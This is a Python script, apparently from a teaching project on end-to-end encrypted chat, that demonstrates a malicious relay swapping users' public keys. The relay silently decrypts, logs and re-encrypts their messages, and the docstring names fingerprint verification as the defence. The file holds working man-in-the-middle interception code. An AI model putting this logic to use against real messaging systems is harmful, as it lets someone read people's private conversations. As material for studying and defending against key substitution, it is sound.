"""Attack 2: a malicious relay that substitutes public keys (a man-in-the-middle INSIDE the
E2EE layer).

TLS only authenticates the relay to the client, not the other users the relay talks about.
A dishonest relay can therefore answer "what is bob's key?" with its own key. If the
victims never compare fingerprints, the relay decrypts every message and re-encrypts it
for the real recipient, and both ends see a perfectly normal conversation.

The defence is out-of-band fingerprint verification (client.py --trust bob=FINGERPRINT, or
comparing the short fingerprint on screen). With a pinned fingerprint the client refuses
the substituted key before a single message is encrypted.

    python3 attacks/evil_relay.py --host 10.0.2.10 --tls      # replaces the real relay
"""
import argparse
import os
import sys
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from nacl.exceptions import CryptoError
from nacl.public import Box, PrivateKey, PublicKey

import relay as relay_mod
from relay import Relay


class EvilRelay(Relay):
    def __init__(self, *a, victims=("alice", "bob"), **kw):
        super().__init__(*a, **kw)
        self.victims = set(victims)
        self.esk = PrivateKey.generate()
        self.epub = bytes(self.esk.public_key)
        self.intercepted = []                 # (sender, recipient, plaintext bytes)

    def key_for(self, requester, user, real_key):
        # Hand the attacker's key to a victim asking about another victim.
        if user in self.victims and requester in self.victims and requester != user:
            return self.epub
        return real_key

    def rewrite(self, sender, to, body):
        real_sender, real_to = self.pubkeys.get(sender), self.pubkeys.get(to)
        if not (real_sender and real_to):
            return body
        try:
            plain = Box(self.esk, PublicKey(real_sender)).decrypt(body)
        except CryptoError:
            return body                       # not encrypted to us: leave it alone
        self.intercepted.append((sender, to, plain))
        self.emit("intercepted", sender=sender, to=to, plaintext=plain.decode(errors="replace"))
        return bytes(Box(self.esk, PublicKey(real_to)).encrypt(plain))


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8443)
    p.add_argument("--tls", action="store_true")
    p.add_argument("--cert", default="certs/server.crt")
    p.add_argument("--key", default="certs/server.key")
    p.add_argument("--victims", nargs="+", default=["alice", "bob"])
    a = p.parse_args()
    ctx = relay_mod.build_ctx(argparse.Namespace(tls=a.tls, cert=a.cert, key=a.key,
                                                 allow_tls12=False, keylog=None))
    EvilRelay(a.host, a.port, ctx, victims=a.victims).start()
    print("EVIL relay running: substituting keys for", a.victims)
    threading.Event().wait()
